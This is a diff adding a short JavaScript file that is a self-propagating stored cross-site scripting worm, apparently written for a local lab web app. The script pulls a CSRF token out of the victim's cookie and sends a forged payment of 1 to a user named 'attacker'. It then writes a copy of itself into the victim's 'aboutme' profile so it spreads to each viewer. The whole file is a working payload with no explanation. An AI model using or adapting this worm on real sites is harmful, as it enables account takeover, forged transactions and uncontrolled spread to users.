@@ -1,0 +1,14 @@
+<script id='myscript'> 
+var http = new XMLHttpRequest(); 
+var url = 'http://localhost:8080/pay';
+var params = 'CSRFToken='+document.cookie.substring(8)+'&recipient=attacker&amount=1';
+http.open('POST', url, true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.send(params);
+var http = new XMLHttpRequest(); 
+var url = '/aboutme';
+var encoded = encodeURIComponent(`<script id="myscript">${document.getElementById("myscript").innerHTML}<\/script>`);
+var params = 'aboutme=' + encoded;
+http.open('POST', url, true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.send(params); </script>
